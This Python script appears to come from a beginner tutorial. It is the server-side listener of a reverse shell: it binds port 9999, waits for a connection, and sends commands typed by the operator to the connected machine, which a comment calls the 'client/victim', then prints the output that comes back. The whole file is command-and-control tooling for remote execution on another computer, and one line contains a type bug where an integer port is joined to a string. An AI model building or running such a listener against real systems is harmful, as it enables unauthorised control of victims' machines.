
import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket() #socket has been created

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the port,socket and listening for connections
#if you are accepting connection, you need to listen to it first
def bind_socket():
    try:
        global host 
        global port
        global s
        print("Binding the Port: " + str(port))

        s.bind((host, port)) #binf the host and the port
        s.listen(5)#how to listeen connection from our client

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()#recursion, means calling the function inside from the function


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept() #return object of a connection, secong five ip address and port
    print("Connection has been established! |" + " IP " + address[0] + " | Port" +  (address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client/victim or a friend
def send_commands(conn): 
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()